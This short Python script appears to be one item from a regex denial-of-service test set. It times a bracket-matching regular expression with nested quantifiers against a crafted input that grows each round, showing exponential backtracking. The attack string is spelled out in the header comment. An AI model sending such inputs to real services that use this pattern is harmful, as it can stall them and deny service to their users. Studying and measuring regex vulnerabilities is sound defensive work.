# 7037
# (?<!\\)\[(\\\[|\\\]|[^\[\]]|(?<!\\)\[.*(?<!\\)\])*(?<!\\)\]
# EXPONENT
# nums:4
# EXPONENT AttackString:"["+"[\\[]"*32+"◎@! _1_EOA(i or ii)"

import re
from time import perf_counter

regex = """(?<!\\)\[(\\\[|\\\]|[^\[\]]|(?<!\\)\[.*(?<!\\)\])*(?<!\\)\]"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "[" + "[\\[]" * i * 1 + "◎@! _1_EOA(i or ii)"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *1}: took {DURATION} seconds!")